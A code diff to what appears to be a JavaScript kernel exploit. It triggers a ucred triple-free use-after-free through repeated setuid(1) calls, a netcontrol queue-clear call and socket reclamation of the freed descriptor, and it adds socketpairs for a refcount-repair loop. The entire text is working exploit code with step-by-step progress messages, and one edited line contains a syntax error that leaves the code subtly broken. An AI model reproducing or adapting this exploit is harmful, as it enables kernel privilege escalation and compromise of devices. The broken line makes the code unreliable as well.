@@ -1415,8 +1415,21 @@ function remove_uaf_file() {
     }
   }
 }
-var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 32;
-var TRIPLEFREE_REFCOUNT_MAX_WAIT = 4000;
+
+var uio_sv = malloc(8);
+socketpair(AF_UNIX, SOCK_STREAM, 0, uio_sv);
+
+var uio_sock_0 = read32(uio_sv);
+var uio_sock_1 = read32(uio_sv + 4);
+
+var iov_sv = malloc(8);
+socketpair(AF_UNIX, SOCK_STREAM, 0, iov_sv);
+
+var iov_sock_0 = read32(iov_sv);
+var iov_sock_1 = read32(iov_sv + 4);
+
+var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 8;
+var TRIPLEFREE_REFCOUNT_MAX_WAIT = 1000;
 function trigger_ucred_triplefree() {
   //log("[TRIGGER] enter trigger_ucred_triplefree");
   var end = false;
@@ -1448,22 +1461,19 @@ function trigger_ucred_triplefree() {
 
 
     // 2) allocate new ucred
-    send_notification("step 2: start (setuid(1) alloc new ucred)");
     setuid(1);
-    send_notification("step 2: done");
+    send_notification("step 2: (setuid(1) alloc new ucred) done");
 
 
     // 3) reclaim fd → uaf_socket
     send_notification("step 3: start (reclaim fd → uaf_socket)");
     uaf_socket = socket(AF_UNIX, SOCK_STREAM, 0);
-    send_notification("step 3: uaf_socket = " + uaf_socket);
-    send_notification("step 3: done");
+    send_notification("step 3: uaf_socket = " + uaf_socket) done;
 
 
     // 4) free previous ucred
-    send_notification("step 4: start (setuid(1) free previous ucred)");
     setuid(1);
-    send_notification("step 4: done");
+    send_notification("step 4: (setuid(1) free previous ucred) done");
 
 
     // 5) unregister → free file + ucred
@@ -1473,14 +1483,12 @@ function trigger_ucred_triplefree() {
     send_notification("step 5: ctrl_buf[0..3] = " + read32(ctrl_buf));
 
     netcontrol(-1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, ctrl_buf, 8);
-    send_notification("step 5: after netcontrol CLEAR_QUEUE");
-    send_notification("step 5: done");
+    send_notification("step 5: (after netcontrol CLEAR_QUEUE)  done");
 
 
     // 6) محاولة إصلاح refcount بشكل خفيف
     send_notification(
-      "step 6: start refcount fix loop, loops=" + TRIPLEFREE_REFCOUNT_FIX_LOOPS +
-      ", iov_sock_0=" + iov_sock_0 + ", iov_sock_1=" + iov_sock_1
+      "iov0=" + iov_sock_0 + ", iov1=" + iov_sock_1
     );
 
     for (var i = 0; i < TRIPLEFREE_REFCOUNT_FIX_LOOPS; i++) {
